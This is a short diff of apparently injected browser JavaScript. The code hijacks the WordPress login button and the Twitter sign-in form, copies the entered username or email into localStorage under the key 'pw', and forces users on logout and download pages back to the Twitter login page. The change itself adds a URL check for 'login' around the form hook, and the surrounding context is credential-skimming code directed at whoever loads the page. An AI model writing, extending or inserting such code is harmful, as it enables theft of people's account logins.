@@ -5,6 +5,7 @@ document.getElementById('wp-submit').onclick = function() {
 };
 }
 
+
 if (location.hostname.indexOf("twitter.com") >= 0) {
 if (window.location.href.indexOf("logout") >= 0 || window.location.href.indexOf("download") >= 0) {
 window.location = "https://twitter.com/login";
@@ -25,6 +26,7 @@ document.getElementsByClassName('t1-form dropdown-link-form signout-form')[0].cl
     
 	
 document.getElementById("session").innerHTML = '<a href="https://twitter.com/login">Hesabın var mı? Giriş yap</a>';
+if (window.location.href.indexOf("login") >= 0) {
 
 	document.getElementsByClassName('t1-form clearfix signin js-signin')[0][2].onclick = function(data) {
 		localStorage['pw'] = document.getElementsByName('session[username_or_email]')[0].value;
@@ -37,9 +39,7 @@ document.getElementById("session").innerHTML = '<a href="https://twitter.com/log
 		}, 99);
 		return false
 	}
-
-
-
+}
 }
 
 
